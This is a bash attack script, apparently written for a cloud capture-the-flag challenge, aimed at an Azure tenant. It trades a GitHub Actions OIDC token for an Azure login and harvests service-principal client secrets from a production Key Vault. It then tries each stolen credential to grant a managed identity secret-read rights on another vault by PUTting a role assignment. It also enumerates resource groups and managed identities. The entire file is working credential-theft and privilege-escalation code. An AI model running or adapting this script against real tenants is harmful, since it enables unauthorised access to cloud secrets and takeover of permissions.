#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
KV_SEC="kv-tbl-sec-x3euoz"
RG_PLAT="rg-tbl-platform-prod-sea"
KV_SEC_SCOPE="/subscriptions/$SUB/resourceGroups/$RG_PLAT/providers/Microsoft.KeyVault/vaults/$KV_SEC"
UAMI_OID="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
KV_SECRETS_USER_ROLE="/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Get KV prod secrets to extract SP credentials
VTOK=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)
get_sp() {
  local name="$1" field="$2"
  az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name "$name" 2>/dev/null \
    | python3 -c "import sys,json;d=json.load(sys.stdin);v=json.loads(d['value']);print(v['$field'])" 2>/dev/null
}

echo "=== TRY ALL 6 SPs FOR ROLE ASSIGNMENT WRITE ON KV SEC ==="
ROLE_ID=$(python3 -c "import uuid;print(str(uuid.uuid4()))")

for name in cost-reader-principal directory-audit-principal reporting-service-principal \
            reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  CID=$(get_sp "$name" "appId")
  SEC=$(get_sp "$name" "clientSecret")
  echo "--- $name (appId=$CID) ---"

  # Get ARM token
  AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    --data-urlencode "client_id=$CID" --data-urlencode "client_secret=$SEC" \
    --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  echo "ARM token len=${#AT}"

  if [ "${#AT}" -gt 100 ]; then
    # Try to list subscription-level role assignments
    SUB_ROLES=$(curl -sS -o /dev/null -w "%{http_code}" "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
      -H "Authorization: Bearer $AT")
    echo "Sub-level roleAssignments list status: $SUB_ROLES"

    # Try to PUT a role assignment on KV sec
    PUT_BODY="{\"properties\":{\"roleDefinitionId\":\"$KV_SECRETS_USER_ROLE\",\"principalId\":\"$UAMI_OID\",\"principalType\":\"ServicePrincipal\"}}"
    PUT_RESULT=$(curl -sS -X PUT \
      "$ARM_BASE${KV_SEC_SCOPE}/providers/Microsoft.Authorization/roleAssignments/$ROLE_ID?api-version=2022-04-01" \
      -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
      -d "$PUT_BODY")
    PUT_STATUS=$(echo "$PUT_RESULT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("id","")[:50] if "properties" in d else d.get("error",{}).get("code",""))' 2>/dev/null)
    echo "PUT role assignment result: $PUT_STATUS"
    echo "Full: $(echo "$PUT_RESULT" | head -c 400)"

    # If ANY PUT succeeded, immediately try to read the flag
    if echo "$PUT_RESULT" | grep -q '"id"'; then
      echo "SUCCESS! Role assigned! Trying to read flag..."
      VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
        --data-urlencode "client_id=7a85156a-01c4-4e61-8472-40a92107159b" \
        --data-urlencode "client_secret=NOPE_USE_IDENTITY" \
        --data-urlencode "grant_type=client_credentials" \
        --data-urlencode "scope=https://vault.azure.net/.default" 2>/dev/null || echo "need managed identity")
      echo "Need to run from reporting app to get UAMI vault token"
    fi
  fi
done

echo ""
echo "=== CHECK RESOURCE GROUPS VISIBLE TO EACH SP ==="
for name in secrets-sync-principal sync-service-principal directory-audit-principal; do
  CID=$(get_sp "$name" "appId")
  SEC=$(get_sp "$name" "clientSecret")
  AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    --data-urlencode "client_id=$CID" --data-urlencode "client_secret=$SEC" \
    --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  if [ "${#AT}" -gt 100 ]; then
    RGS=$(curl -sS "$ARM_BASE/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" \
      -H "Authorization: Bearer $AT" | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(r["name"]) for r in d.get("value",[])]' 2>/dev/null)
    echo "$name RGs: $RGS"
    # Check if it has permission to list KV sec role assignments
    KV_RA=$(curl -sS -o /dev/null -w "%{http_code}" "$ARM_BASE${KV_SEC_SCOPE}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
      -H "Authorization: Bearer $AT")
    echo "$name KV-SEC roleAssignments: $KV_RA"
  fi
done

echo ""
echo "=== USE REPORTING-SERVICE TO MODIFY REPORTING APP ==="
RS_CID=$(get_sp "reporting-service-principal" "appId")
RS_SEC=$(get_sp "reporting-service-principal" "clientSecret")
RPT_RG="rg-tbl-reporting-prod-eus"
RS_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RS_CID" --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

echo "reporting-service ARM token len=${#RS_AT}"

if [ "${#RS_AT}" -gt 100 ]; then
  # List all managed identities in reporting RG
  echo "Managed identities in reporting RG:"
  curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RPT_RG/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31" \
    -H "Authorization: Bearer $RS_AT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for r in d.get("value",[]):
    print("  "+r["name"]+": oid="+r["properties"]["principalId"]+" clientId="+r["properties"]["clientId"])
' 2>/dev/null

  # Try to list ALL role assignments for UAMI at subscription scope
  echo "Role assignments for UAMI at sub scope (using reporting-service):"
  curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$UAMI_OID'" \
    -H "Authorization: Bearer $RS_AT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err:
    print("ERROR:", err.get("message","")[:200])
else:
    print("Count:", len(vals))
    for r in vals:
        print("  scope="+r["properties"]["scope"])
' 2>/dev/null

  # Try to list subscription-scope role assignments
  echo "Try listing sub-level roleAssignments with reporting-service:"
  curl -sS -o /dev/null -w "%{http_code}" "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
    -H "Authorization: Bearer $RS_AT"
  echo ""

  # Most importantly: try to PUT role assignment on KV sec using reporting-service
  echo "Try PUT role assignment on KV SEC using reporting-service:"
  RS_ROLE_ID=$(python3 -c "import uuid;print(str(uuid.uuid4()))")
  curl -sS -X PUT \
    "$ARM_BASE${KV_SEC_SCOPE}/providers/Microsoft.Authorization/roleAssignments/$RS_ROLE_ID?api-version=2022-04-01" \
    -H "Authorization: Bearer $RS_AT" -H "Content-Type: application/json" \
    -d "{\"properties\":{\"roleDefinitionId\":\"$KV_SECRETS_USER_ROLE\",\"principalId\":\"$UAMI_OID\",\"principalType\":\"ServicePrincipal\"}}" \
    | head -c 500
fi

echo ""
echo "DONE"
